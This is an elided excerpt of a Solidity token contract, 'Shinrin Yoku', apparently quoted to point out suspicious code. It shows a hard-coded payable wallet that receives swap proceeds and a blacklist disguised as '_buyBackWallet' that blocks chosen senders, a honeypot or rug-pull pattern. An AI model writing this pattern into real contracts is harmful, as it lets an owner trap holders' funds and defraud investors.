...
contract ShinrinYoku is Context, IERC20, Ownable{
    ...
    string private _name = "Shinrin Yoku";

    string private _symbol = "$SHINRIN";
    ...
    constructor () {
        ...
        PAYABLE0x = payable(address(0xcF2C4ab2E7cB50f40c4Eb28B3d9a2c9d5D5D84B6));
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(MarketAmount > 0)
            PAYABLE0x.transfer(MarketAmount);
    }
    ...
    function _transfer(address from, address to, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (_isExcludefromFee[from] || _isExcludefromFee[to]){
                ...
                require(!_buyBackWallet[from], "ERC20: lose");
